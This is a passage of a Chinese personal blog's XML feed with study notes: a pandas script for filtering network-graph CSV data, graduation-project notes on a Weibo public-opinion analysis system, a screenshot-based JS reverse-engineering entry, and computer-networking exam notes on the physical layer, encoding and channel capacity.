class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br>edge_str = pd.read_csv(<span class="hljs-string">&#x27;edge.csv&#x27;</span>,encoding=<span class="hljs-string">&#x27;gbk&#x27;</span>)<br>edge_str.shape<br><br>edge_str1 = edge_str[edge_str[<span class="hljs-string">&#x27;Weight&#x27;</span>]&gt;<span class="hljs-number">3</span>]<br>edge_str1.shape<br><br>Source = edge_str1[<span class="hljs-string">&#x27;Source&#x27;</span>].tolist()<br>Target = edge_str1[<span class="hljs-string">&#x27;Target&#x27;</span>].tolist()<br>co = Source + Target<br>co =list(set(co))<br><br>node_str = pd.read_csv(<span class="hljs-string">&#x27;node.csv&#x27;</span>,encoding=<span class="hljs-string">&#x27;gbk&#x27;</span>)<br><span class="hljs-comment">#node_str</span><br><br>node_str=node_str[node_str[<span class="hljs-string">&#x27;Label&#x27;</span>].isin(co)]<br>node_str[<span class="hljs-string">&#x27;id&#x27;</span>]=node_str[<span class="hljs-string">&#x27;Label&#x27;</span>]<br>node_str = node_str[[<span class="hljs-string">&#x27;id&#x27;</span>,<span class="hljs-string">&#x27;Label&#x27;</span>,<span class="hljs-string">&#x27;Weight&#x27;</span>]] <span class="hljs-comment"># 调整列顺序</span><br><span class="hljs-comment">#node_str</span><br><br>node_str.to_csv(path_or_buf=<span class="hljs-string">&quot;node.txt&quot;</span>, index=<span class="hljs-literal">False</span>) <span class="hljs-comment"># 写入csv文件</span><br>edge_str1.to_csv(path_or_buf=<span class="hljs-string">&quot;edge.txt&quot;</span>, index=<span class="hljs-literal">False</span>) <span class="hljs-comment"># 写入csv文件</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Graduation project </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python绘制关系网络图</title>
      <link href="/2022/11/16/2022/11/11.16/"/>
      <url>/2022/11/16/2022/11/11.16/</url>
      
        <content type="html"><![CDATA[<h2 id="博客参考"><a href="#博客参考" class="headerlink" title="博客参考"></a>博客参考</h2><p>1.<a href="https://blog.csdn.net/m0_45827246/article/details/121241477">https://blog.csdn.net/m0_45827246/article/details/121241477</a></p><p>2.<a href="https://blog.csdn.net/qq_42374697/article/details/113060314">https://blog.csdn.net/qq_42374697/article/details/113060314</a></p><p>3.<a href="https://blog.csdn.net/qq_42374697/article/details/112849248">https://blog.csdn.net/qq_42374697/article/details/112849248</a></p><h2 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h2><p>Gephi、cytoscape</p><h2 id="在线绘图"><a href="#在线绘图" class="headerlink" title="在线绘图"></a>在线绘图</h2><p><a href="http://www.bioinformatics.com.cn/plot_basic_miRNA_target_network_plot_197">微生信 - 在线绘制miRNA靶基因网络图</a></p><p><a href="https://www.tuyitu.com/ps/sources/">PS |Online Photoshop 【在线PS】</a></p>]]></content>
      
      
      <categories>
          
          <category> Graduation project </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>课题</title>
      <link href="/2022/11/08/2022/11/11.8/"/>
      <url>/2022/11/08/2022/11/11.8/</url>
      
        <content type="html"><![CDATA[<h2 id="课题：基于大数据的高校舆情分析系统"><a href="#课题：基于大数据的高校舆情分析系统" class="headerlink" title="课题：基于大数据的高校舆情分析系统"></a>课题：基于大数据的高校舆情分析系统</h2><p> 想法嘛，选择微博平台，然后几个切入点</p><p>1.关键词</p><p>2.单博文评论</p><p>3.用户</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p>1.<a href="https://zhuanlan.zhihu.com/p/367880841">https://zhuanlan.zhihu.com/p/367880841</a></p><p>2.<a href="https://blog.csdn.net/caxiou/article/details/127726697">https://blog.csdn.net/caxiou/article/details/127726697</a></p><p>3.<a href="https://www.sohu.com/a/593651077_121195434">https://www.sohu.com/a/593651077_121195434</a></p><h3 id="参考项目"><a href="#参考项目" class="headerlink" title="参考项目"></a>参考项目</h3><p><a href="https://buyixiao.github.io/blog/weibo-super-spider#LDA">https://buyixiao.github.io/blog/weibo-super-spider#LDA</a></p><p><a href="http://buyixiao.xyz/custom-vis/topics-daily-sentiment-compare-visual/">http://buyixiao.xyz/custom-vis/topics-daily-sentiment-compare-visual/</a></p><h3 id="笔记链接"><a href="#笔记链接" class="headerlink" title="笔记链接"></a>笔记链接</h3><h4 id="linux定时任务"><a href="#linux定时任务" class="headerlink" title="linux定时任务"></a>linux定时任务</h4><p><a href="https://zhuanlan.zhihu.com/p/115082330">https://zhuanlan.zhihu.com/p/115082330</a></p><p><a href="https://www.cnblogs.com/SunArmy/p/13096861.html">https://www.cnblogs.com/SunArmy/p/13096861.html</a></p><h4 id="python后台运行"><a href="#python后台运行" class="headerlink" title="python后台运行"></a>python后台运行</h4><p><a href="https://www.cnblogs.com/gaidy/p/10736642.html">https://www.cnblogs.com/gaidy/p/10736642.html</a></p><p>出现的问题：定时任务后，数据表是成功得到删除，但同样的执行爬取数据的指令却没有成功</p><p>暂时将整个文件改成了每次访问路由就重新爬取、生成</p><h4 id="nodejs环境配置"><a href="#nodejs环境配置" class="headerlink" title="nodejs环境配置"></a>nodejs环境配置</h4><p><a href="https://help.aliyun.com/document_detail/50775.html">https://help.aliyun.com/document_detail/50775.html</a></p><p>目前找到问题：定时任务执行后，生成的db文件跑到/root目录下，</p><h4 id="python转换时区"><a href="#python转换时区" class="headerlink" title="python转换时区"></a>python转换时区</h4><p><a href="https://blog.csdn.net/BigBoy_Coder/article/details/102956868">https://blog.csdn.net/BigBoy_Coder/article/details/102956868</a></p><h4 id="python读取zipfile"><a href="#python读取zipfile" class="headerlink" title="python读取zipfile"></a>python读取zipfile</h4><p><a href="https://blog.csdn.net/zhuoqingjoking97298/article/details/121974670">https://blog.csdn.net/zhuoqingjoking97298/article/details/121974670</a></p><h4 id="python处理html文章提取文字"><a href="#python处理html文章提取文字" class="headerlink" title="python处理html文章提取文字"></a>python处理html文章提取文字</h4><p><a href="https://zhuanlan.zhihu.com/p/26192335">https://zhuanlan.zhihu.com/p/26192335</a></p>]]></content>
      
      
      <categories>
          
          <category> Graduation project </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webpack案例</title>
      <link href="/2022/08/27/2022/8/webpack%E6%A1%88%E4%BE%8B/"/>
      <url>/2022/08/27/2022/8/webpack%E6%A1%88%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<p><img src="/2022/08/27/2022/8/webpack%E6%A1%88%E4%BE%8B/image-20220827091228104.png" alt="image-20220827091228104"></p><p><img src="/2022/08/27/2022/8/webpack%E6%A1%88%E4%BE%8B/image-20220827091356539.png" alt="image-20220827091554408"></p><p><img src="/2022/08/27/2022/8/webpack%E6%A1%88%E4%BE%8B/image-20220827091738615.png" alt="image-20220827091738615"></p><p><img src="/2022/08/27/2022/8/webpack%E6%A1%88%E4%BE%8B/image-20220827092006650.png" alt="image-20220827092006650"></p><p><img src="/2022/08/27/2022/8/webpack%E6%A1%88%E4%BE%8B/image-20220827092119186.png" alt="image-20220827092119186"></p><p><img src="/2022/08/27/2022/8/webpack%E6%A1%88%E4%BE%8B/image-20220827092414585.png" alt="image-20220827092414585"></p><p><img src="/2022/08/27/2022/8/webpack%E6%A1%88%E4%BE%8B/image-20220827092557478.png" alt="image-20220827092557478"></p><p><img src="/2022/08/27/2022/8/webpack%E6%A1%88%E4%BE%8B/image-20220827092705308.png" alt="image-20220827092705308"></p><p><img src="/2022/08/27/2022/8/webpack%E6%A1%88%E4%BE%8B/image-20220827092933904.png" alt="image-20220827092933904"></p><p><img src="/2022/08/27/2022/8/webpack%E6%A1%88%E4%BE%8B/image-20220827093027798.png" alt="image-20220827093027798"></p><p><img src="/2022/08/27/2022/8/webpack%E6%A1%88%E4%BE%8B/image-20220827093203215.png" alt="image-20220827093203215"></p><p><img src="/2022/08/27/2022/8/webpack%E6%A1%88%E4%BE%8B/image-20220827093330015.png" alt="image-20220827093330015"></p><p><img src="/2022/08/27/2022/8/webpack%E6%A1%88%E4%BE%8B/image-20220827093527572.png" alt="image-20220827093527572"></p><p><img src="/2022/08/27/2022/8/webpack%E6%A1%88%E4%BE%8B/image-20220827093608322.png" alt="image-20220827093608322"></p><p><img src="/2022/08/27/2022/8/webpack%E6%A1%88%E4%BE%8B/image-20220827093704108.png" alt="image-20220827093704108"></p><p>遇到defined报错，window = global，navigator = {}即可</p><p>至此，加密分析完毕，后续python调用js文件获取加密后的字符串即可</p>]]></content>
      
      
      <categories>
          
          <category> js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>物理层传输介质</title>
      <link href="/2022/07/14/2022/7/day7/"/>
      <url>/2022/07/14/2022/7/day7/</url>
      
        <content type="html"><![CDATA[<h2 id="物理层传输介质"><a href="#物理层传输介质" class="headerlink" title="物理层传输介质"></a>物理层传输介质</h2><p>概念</p><p><img src="/2022/07/14/2022/7/day7/image-20220714185002898.png" alt="image-20220714185002898"></p><p>传输媒体并不是物理层！</p><p><img src="/2022/07/14/2022/7/day7/image-20220714185107141.png" alt="image-20220714185107141"></p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p><img src="/2022/07/14/2022/7/day7/image-20220714185130581.png" alt="image-20220714185130581"></p><h3 id="导向性传输介质"><a href="#导向性传输介质" class="headerlink" title="导向性传输介质"></a>导向性传输介质</h3><h4 id="导向性传输介质–1-双绞线"><a href="#导向性传输介质–1-双绞线" class="headerlink" title="导向性传输介质–1.双绞线"></a>导向性传输介质–1.双绞线</h4><p><img src="/2022/07/14/2022/7/day7/image-20220714185239353.png" alt="image-20220714185239353"></p><p>绞合的目的：</p><p><img src="/2022/07/14/2022/7/day7/image-20220714185312415.png" alt="image-20220714185312415"></p><p><img src="/2022/07/14/2022/7/day7/image-20220714185533866.png" alt="image-20220714185533866"></p><p><img src="/2022/07/14/2022/7/day7/image-20220714185359417.png" alt="image-20220714185359417"></p><p><img src="/2022/07/14/2022/7/day7/image-20220714185457822.png" alt="image-20220714185457822"></p><h4 id="导向性传输介质–2-同轴电缆"><a href="#导向性传输介质–2-同轴电缆" class="headerlink" title="导向性传输介质–2.同轴电缆"></a>导向性传输介质–2.同轴电缆</h4><p><img src="/2022/07/14/2022/7/day7/image-20220714185617943.png" alt="image-20220714185617943"></p><p>了解同轴电缆有这两种分类</p><p><img src="/2022/07/14/2022/7/day7/image-20220714185735222.png" alt="image-20220714185735222"></p><h4 id="导向性传输介质–3-光纤"><a href="#导向性传输介质–3-光纤" class="headerlink" title="导向性传输介质–3.光纤"></a>导向性传输介质–3.光纤</h4><p><img src="/2022/07/14/2022/7/day7/image-20220714185855268.png" alt="image-20220714185855268"></p><p><img src="/2022/07/14/2022/7/day7/image-20220714185936161.png" alt="image-20220714185936161"></p><p>光纤的构造</p><p><img src="/2022/07/14/2022/7/day7/image-20220714190009143.png" alt="image-20220714190009143"></p><p>超低损耗，传送超远距离！</p><p>不同的光纤</p><p><img src="/2022/07/14/2022/7/day7/image-20220714190335259.png" alt="image-20220714190335259"></p><p><img src="/2022/07/14/2022/7/day7/image-20220714190405783.png" alt="image-20220714190405783"></p><p>光纤的特点</p><p><img src="/2022/07/14/2022/7/day7/image-20220714190518996.png" alt="image-20220714190518996"></p><h3 id="非导向性传输介质"><a href="#非导向性传输介质" class="headerlink" title="非导向性传输介质"></a>非导向性传输介质</h3><p>主要考察3种</p><p>无线电波，微波，红外线、激光</p><img src="/2022/07/14/2022/7/day7/image-20220714190658652.png" alt="image-20220714190658652" style="zoom:50%;"><h4 id="无线电波"><a href="#无线电波" class="headerlink" title="无线电波"></a>无线电波</h4><p><img src="/2022/07/14/2022/7/day7/image-20220714190920007.png" alt="image-20220714190920007"></p><h4 id="微波"><a href="#微波" class="headerlink" title="微波"></a>微波</h4><p><img src="/2022/07/14/2022/7/day7/image-20220714190948381.png" alt="image-20220714190948381"></p><h4 id="红外线、激光"><a href="#红外线、激光" class="headerlink" title="红外线、激光"></a>红外线、激光</h4><h4 id><a href="#" class="headerlink" title></a><img src="/2022/07/14/2022/7/day7/image-20220714191103450.png" alt="image-20220714191103450"></h4><h2 id="脑图时刻"><a href="#脑图时刻" class="headerlink" title="脑图时刻"></a>脑图时刻</h2><p><img src="/2022/07/14/2022/7/day7/image-20220714191131507.png" alt="image-20220714191131507"></p><h2 id="物理层设备"><a href="#物理层设备" class="headerlink" title="物理层设备"></a>物理层设备</h2><h3 id="中继器"><a href="#中继器" class="headerlink" title="中继器"></a>中继器</h3><p>诞生原因</p><p><img src="/2022/07/14/2022/7/day7/image-20220714191306670.png" alt="image-20220714191306670"></p><p>功能</p><p><img src="/2022/07/14/2022/7/day7/image-20220714191335255.png" alt="image-20220714191335255"></p><p>中继器的两端</p><p><img src="/2022/07/14/2022/7/day7/image-20220714191618684.png" alt="image-20220714191618684"></p><p>5-4-3规则</p><p><img src="/2022/07/14/2022/7/day7/image-20220714191649097.png" alt="image-20220714191649097"></p><p><img src="/2022/07/14/2022/7/day7/image-20220714191814468.png" alt="image-20220714191814468"></p><h3 id="集线器（多口中继器）"><a href="#集线器（多口中继器）" class="headerlink" title="集线器（多口中继器）"></a>集线器（多口中继器）</h3><p>再生，放大信号</p><p>功能</p><p><img src="/2022/07/14/2022/7/day7/image-20220714191927992.png" alt="image-20220714191927992"></p><p><img src="/2022/07/14/2022/7/day7/image-20220714192007285.png" alt="image-20220714192007285"></p><p>集线器不能分割冲突域！</p><p>这样导致连在集线器上的工作主机平分带宽，效率低</p><h2 id="第二章总结"><a href="#第二章总结" class="headerlink" title="第二章总结"></a>第二章总结</h2><p><img src="/2022/07/14/2022/7/day7/image-20220718171513747.png" alt="image-20220718171513747"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机考研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> computer network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编码与调制</title>
      <link href="/2022/07/12/2022/7/day6/"/>
      <url>/2022/07/12/2022/7/day6/</url>
      
        <content type="html"><![CDATA[<h2 id="编码与调制（一）"><a href="#编码与调制（一）" class="headerlink" title="编码与调制（一）"></a>编码与调制（一）</h2><h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><h4 id="基带信号与宽带信号"><a href="#基带信号与宽带信号" class="headerlink" title="基带信号与宽带信号"></a>基带信号与宽带信号</h4><p><img src="/2022/07/12/2022/7/day6/image-20220712150745721.png" alt="image-20220712150824853"></p><p>看最后到什么信号来区分</p><p><img src="/2022/07/12/2022/7/day6/image-20220712151132126.png" alt="image-20220712151132126"></p><p>不同的处理（设备不是重点，有个印象就好）</p><p><img src="/2022/07/12/2022/7/day6/image-20220712151252497.png" alt="image-20220712151252497"></p><h2 id="编码与调制（二）"><a href="#编码与调制（二）" class="headerlink" title="编码与调制（二）"></a>编码与调制（二）</h2><h3 id="数字数据编码为数字信号"><a href="#数字数据编码为数字信号" class="headerlink" title="数字数据编码为数字信号"></a>数字数据编码为数字信号</h3><p><img src="/2022/07/12/2022/7/day6/image-20220712151458932.png" alt="image-20220712151458932"></p><p>前三种是重点，后三种需了解</p><h4 id="1）非归零编码"><a href="#1）非归零编码" class="headerlink" title="1）非归零编码"></a>1）非归零编码</h4><p><img src="/2022/07/12/2022/7/day6/image-20220712151557699.png" alt="image-20220712151557699"></p><p>难以保持同步：万一 一长串都是1，那就是一条直线，不好分辨</p><h4 id="2）曼彻斯特编码"><a href="#2）曼彻斯特编码" class="headerlink" title="2）曼彻斯特编码"></a>2）曼彻斯特编码</h4><p><img src="/2022/07/12/2022/7/day6/image-20220712152438514.png" alt="image-20220712152438514"></p><p><img src="/2022/07/12/2022/7/day6/image-20220712152614615.png" alt="image-20220712152614615"></p><p><img src="/2022/07/12/2022/7/day6/image-20220712152637808.png" alt="image-20220712152637808"></p><h4 id="3）差分曼彻斯特编码"><a href="#3）差分曼彻斯特编码" class="headerlink" title="3）差分曼彻斯特编码"></a>3）差分曼彻斯特编码</h4><p><img src="/2022/07/12/2022/7/day6/image-20220712152844808.png" alt="image-20220712152844808"></p><p>红代表下一个码元是0</p><p>蓝代表下一个码元是1</p><h4 id="4）归零编码"><a href="#4）归零编码" class="headerlink" title="4）归零编码"></a>4）归零编码</h4><p><img src="/2022/07/12/2022/7/day6/image-20220712151932823.png" alt="image-20220712151932823"></p><p>对于单个码元最后肯定得到零（就是变成低的），图上可以看出对于数字1内的码元，前面高一定会下降到低的</p><h4 id="5）反向不归零编码"><a href="#5）反向不归零编码" class="headerlink" title="5）反向不归零编码"></a>5）反向不归零编码</h4><p><img src="/2022/07/12/2022/7/day6/image-20220712152116389.png" alt="image-20220712152116389"></p><p>到0就翻转，1就不变</p><p>缺点：如果全为1就不变，接收方又不懂怎么办</p><h4 id="6）4B-5B编码"><a href="#6）4B-5B编码" class="headerlink" title="6）4B/5B编码"></a>6）4B/5B编码</h4><p><img src="/2022/07/12/2022/7/day6/image-20220712153128807.png" alt="image-20220712153128807"></p><p>16种表示，剩下16种作为状态码</p><h3 id="数字数据调制为模拟信号"><a href="#数字数据调制为模拟信号" class="headerlink" title="数字数据调制为模拟信号"></a>数字数据调制为模拟信号</h3><p>数字数据调制技术</p><p><img src="/2022/07/12/2022/7/day6/image-20220712153313463.png" alt="image-20220712153313463"></p><p><img src="/2022/07/12/2022/7/day6/image-20220712153441240.png" alt="image-20220712153441240"></p><p><img src="/2022/07/12/2022/7/day6/image-20220712153522016.png" alt="image-20220712153522016"></p><p>例题</p><p><img src="/2022/07/12/2022/7/day6/image-20220712153536933.png" alt="image-20220712153536933"></p><img src="/2022/07/12/2022/7/day6/image-20220712153818929.png" alt="image-20220712153818929" style="zoom:50%;"><h3 id="模拟数字编码为数字信号"><a href="#模拟数字编码为数字信号" class="headerlink" title="模拟数字编码为数字信号"></a>模拟数字编码为数字信号</h3><p><img src="/2022/07/12/2022/7/day6/image-20220712160723207.png" alt="image-20220712160723207"></p><p>例子</p><p><img src="/2022/07/12/2022/7/day6/image-20220712160751244.png" alt="image-20220712160751244"></p><h4 id="1-抽样"><a href="#1-抽样" class="headerlink" title="1.抽样"></a>1.抽样</h4><p><img src="/2022/07/12/2022/7/day6/image-20220712160834294.png" alt="image-20220712160834294"></p><p><img src="/2022/07/12/2022/7/day6/image-20220712160900192.png" alt="image-20220712160900192"></p><p>红字原因待：</p><h4 id="2-量化"><a href="#2-量化" class="headerlink" title="2.量化"></a>2.量化</h4><p><img src="/2022/07/12/2022/7/day6/image-20220712160922966.png" alt="image-20220712160922966"></p><h4 id="3-编码"><a href="#3-编码" class="headerlink" title="3.编码"></a>3.编码</h4><p><img src="/2022/07/12/2022/7/day6/image-20220712161024343.png" alt="image-20220712161024343"></p><p><img src="/2022/07/12/2022/7/day6/image-20220712161129133.png" alt="image-20220712161129133"></p><h3 id="模拟数据调制为模拟信号"><a href="#模拟数据调制为模拟信号" class="headerlink" title="模拟数据调制为模拟信号"></a>模拟数据调制为模拟信号</h3><p><img src="/2022/07/12/2022/7/day6/image-20220712162106430.png" alt="image-20220712162106430"></p><p>广播电台讲话，通过这个使得受损较小，这样信号到接收方可以还原成基带信号</p><p><img src="/2022/07/12/2022/7/day6/image-20220712162236441.png" alt="image-20220712162236441"></p><h2 id="脑图时刻"><a href="#脑图时刻" class="headerlink" title="脑图时刻"></a>脑图时刻</h2><p><img src="/2022/07/12/2022/7/day6/image-20220712162334694.png" alt="image-20220712162334694"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机考研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> computer network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>奈氏准则|香农定理</title>
      <link href="/2022/07/10/2022/7/day5/"/>
      <url>/2022/07/10/2022/7/day5/</url>
      
        <content type="html"><![CDATA[<h3 id="奈氏准则-香农定理"><a href="#奈氏准则-香农定理" class="headerlink" title="奈氏准则|香农定理"></a>奈氏准则|香农定理</h3><h3 id="预备知识："><a href="#预备知识：" class="headerlink" title="预备知识："></a>预备知识：</h3><p>失真</p><p><img src="/2022/07/10/2022/7/day5/image-20220710165755605.png" alt="image-20220710165755605"></p><img src="/2022/07/10/2022/7/day5/image-20220710165828667.png" alt="image-20220710165828667" style="zoom:50%;"><p><img src="/2022/07/10/2022/7/day5/image-20220710165901784.png" alt="image-20220710165901784"></p><p>前面三种正相关，后面一种负相关</p><p>码间串扰</p><p><img src="/2022/07/10/2022/7/day5/image-20220710165957441.png" alt="image-20220710165957441"></p><p>1.第一种，振动频率太低，衰减过程种损耗差不多</p><p>2.第四种，振动频率或速度太高，接收方无法区分波形之间的差异</p><p>都导致码间串扰现象</p><p>频率越高，振动越快</p><p><img src="/2022/07/10/2022/7/day5/image-20220710170039878.png" alt="image-20220710170039878"></p><p>信道带宽</p><img src="/2022/07/10/2022/7/day5/image-20220710170059936.png" alt="image-20220710170059936" style="zoom:50%;"><p><img src="/2022/07/10/2022/7/day5/image-20220710170345736.png" alt="image-20220710170345736"></p><h3 id="1-奈氏准则"><a href="#1-奈氏准则" class="headerlink" title="1.奈氏准则"></a>1.奈氏准则</h3><p><img src="/2022/07/10/2022/7/day5/image-20220710170453208.png" alt="image-20220710170453208"></p><p>带宽在奈氏准则和香农公式</p><img src="/2022/07/10/2022/7/day5/image-20220710170540655.png" alt="image-20220710170540655" style="zoom:50%;"><p>考研中，求极限数据率</p><p><img src="/2022/07/10/2022/7/day5/image-20220710170724733.png" alt="image-20220710170724733"></p><p>由此得出两个结论</p><p><img src="/2022/07/10/2022/7/day5/image-20220710170846452.png" alt="image-20220710170846452"></p><p>例题：</p><p><img src="/2022/07/10/2022/7/day5/image-20220710170909553.png" alt="image-20220710170909553"></p><p>答案：</p><p><img src="/2022/07/10/2022/7/day5/image-20220710171004017.png" alt="image-20220710171004017"></p><p>4：log2 16 =4</p><h3 id="2-香农定理"><a href="#2-香农定理" class="headerlink" title="2.香农定理"></a>2.香农定理</h3><p>信噪比</p><p><img src="/2022/07/10/2022/7/day5/image-20220710171056349.png" alt="image-20220710171056349"></p><p><img src="/2022/07/10/2022/7/day5/image-20220710171204359.png" alt="image-20220710171204359"></p><p>一般要计算S/N是多少</p><p>香农定理计算公式</p><p><img src="/2022/07/10/2022/7/day5/image-20220710171320725.png" alt="image-20220710171320725"></p><p>得到的结论：</p><p><img src="/2022/07/10/2022/7/day5/image-20220710171404046.png" alt="image-20220710171404046"></p><p>例题</p><p><img src="/2022/07/10/2022/7/day5/image-20220710171425616.png" alt="image-20220710171425616"></p><p>答案</p><p><img src="/2022/07/10/2022/7/day5/image-20220710171501426.png" alt="image-20220710171501426"></p><h3 id="综合比较"><a href="#综合比较" class="headerlink" title="综合比较"></a>综合比较</h3><p><img src="/2022/07/10/2022/7/day5/image-20220710161435562.png" alt="image-20220710161435562"></p><p>题目（需要两种同时计算再比较，真实数据率取较小一个）</p><p><img src="/2022/07/10/2022/7/day5/image-20220710171628596.png" alt="image-20220710171628596"></p><p>答案</p><p><img src="/2022/07/10/2022/7/day5/image-20220710171713888.png" alt="image-20220710171713888"></p><p>取8000b/s</p>]]></content>
      
      
      <categories>
          
          <category> 计算机考研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> computer network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>物理层基本概念</title>
      <link href="/2022/07/08/2022/7/day4/"/>
      <url>/2022/07/08/2022/7/day4/</url>
      
        <content type="html"><![CDATA[<h3 id="预告"><a href="#预告" class="headerlink" title="预告"></a>预告</h3><img src="/2022/07/08/2022/7/day4/image-20220708091510682.png" alt="image-20220708091510682" style="zoom:50%;"><p>第2个比较重要，需要计算</p><h2 id="物理层基本概念"><a href="#物理层基本概念" class="headerlink" title="物理层基本概念"></a>物理层基本概念</h2><p><img src="/2022/07/08/2022/7/day4/image-20220708091603325.png" alt="image-20220708091603324"></p><p><img src="/2022/07/08/2022/7/day4/image-20220708091603324.png" alt="image-20220708091714778"></p><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><p><img src="/2022/07/08/2022/7/day4/image-20220708092004442.png" alt="image-20220708092004442"></p><p>绿色解释2，蓝色解释3</p><h3 id="数据通信基础知识"><a href="#数据通信基础知识" class="headerlink" title="数据通信基础知识"></a>数据通信基础知识</h3><p><img src="/2022/07/08/2022/7/day4/image-20220708092131546.png" alt="image-20220708092131546"></p><p>发送在吗？</p><p>网卡发出刚才信息的比特流，变成数字信号</p><p>通过猫（调制解调器）</p><p>信源：产生输入数据</p><p><img src="/2022/07/08/2022/7/day4/image-20220708092610050.png" alt="image-20220708092610050"></p><h3 id="数据通信相关术语"><a href="#数据通信相关术语" class="headerlink" title="数据通信相关术语"></a>数据通信相关术语</h3><p><img src="/2022/07/08/2022/7/day4/image-20220708093037451.png" alt="image-20220708093037451"></p><h3 id="三种通信方式"><a href="#三种通信方式" class="headerlink" title="三种通信方式"></a>三种通信方式</h3><h4 id="1-单工通信"><a href="#1-单工通信" class="headerlink" title="1.单工通信"></a>1.单工通信</h4><p><img src="/2022/07/08/2022/7/day4/image-20220708093115380.png" alt="image-20220708093115380"></p><p>确定发送方和接收方</p><h4 id="2-双工通信"><a href="#2-双工通信" class="headerlink" title="2.双工通信"></a>2.双工通信</h4><p><img src="/2022/07/08/2022/7/day4/image-20220708093157052.png" alt="image-20220708093157052"></p><p>两方角色可以调换，但是不能同时发送数据</p><h4 id="3-全双工通信"><a href="#3-全双工通信" class="headerlink" title="3.全双工通信"></a>3.全双工通信</h4><p><img src="/2022/07/08/2022/7/day4/image-20220708093258205.png" alt="image-20220708093258205"></p><p>两种数据传输方式</p><img src="/2022/07/08/2022/7/day4/image-20220708093737939.png" alt="image-20220708093737939" style="zoom:50%;"><p>串行：一次一个比特排好队</p><p>并行：发送方和接收方通过多条信道同时发送接受多个比特，用于计算机内部数据传输</p><img src="/2022/07/08/2022/7/day4/image-20220708093844643.png" alt="image-20220708093844643" style="zoom:50%;"><p><img src="/2022/07/08/2022/7/day4/image-20220710093118266.png" alt="image-20220710093118266"></p><h3 id="码元"><a href="#码元" class="headerlink" title="码元"></a>码元</h3><p><img src="/2022/07/08/2022/7/day4/image-20220710093305592.png" alt="image-20220710093305592"></p><p>码元是固定时长内的信号</p><p><img src="/2022/07/08/2022/7/day4/image-20220710093726231.png" alt="image-20220710093726231"></p><p>这边的横线可以看成码元宽度</p><p>举例解释码元：4进制码元</p><p><img src="/2022/07/08/2022/7/day4/image-20220710093828317.png" alt="image-20220710093828317"></p><p>4种高低不同的信号波形</p><p><img src="/2022/07/08/2022/7/day4/image-20220710093913914.png" alt="image-20220710093913914"></p><p>比如 ，假设高度是越来愈高，电压上升</p><p><img src="/2022/07/08/2022/7/day4/image-20220710094013135.png" alt="image-20220710094013135"></p><h3 id="速率、波特"><a href="#速率、波特" class="headerlink" title="速率、波特"></a>速率、波特</h3><p><img src="/2022/07/08/2022/7/day4/image-20220710094112366.png" alt="image-20220710094112366"></p><p>主要考察码元传输速率</p><p><img src="/2022/07/08/2022/7/day4/image-20220710094214790.png" alt="image-20220710094214790"></p><p><img src="/2022/07/08/2022/7/day4/image-20220710094306973.png" alt="image-20220710094306973"></p><p><img src="/2022/07/08/2022/7/day4/image-20220710094345884.png" alt="image-20220710094345884"></p><p>码元个数：5</p><p>脉冲个数：5</p><p>信号变化次数：5</p><p>1Band（波特） = 1码元/s</p><p><img src="/2022/07/08/2022/7/day4/image-20220710094556602.png" alt="image-20220710094556602"></p><p><img src="/2022/07/08/2022/7/day4/image-20220710094617124.png" alt="image-20220710094617124"></p><p>两种速率关系</p><p><img src="/2022/07/08/2022/7/day4/image-20220710094641043.png" alt="image-20220710094641043"></p><p>例子：</p><p><img src="/2022/07/08/2022/7/day4/image-20220710094733743.png" alt="image-20220710094733743"></p><h3 id="带宽"><a href="#带宽" class="headerlink" title="带宽"></a>带宽</h3><p><img src="/2022/07/08/2022/7/day4/image-20220710094825956.png" alt="image-20220710094825956"></p><p>带宽是理想中速率，而速率是实际速率</p><p>例题考察</p><p><img src="/2022/07/08/2022/7/day4/image-20220710095152764.png" alt="image-20220710095152764"></p><p>一个码元用两位比特</p><p>4进制4种离散状态</p><p>2位才能表示4种状态，然后以2为底</p><p><img src="/2022/07/08/2022/7/day4/image-20220710095313300.png" alt="image-20220710095313300"></p><p><img src="/2022/07/08/2022/7/day4/image-20220710095409905.png" alt="image-20220710095409905"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机考研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> computer network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络分层结构</title>
      <link href="/2022/07/07/2022/7/day3/"/>
      <url>/2022/07/07/2022/7/day3/</url>
      
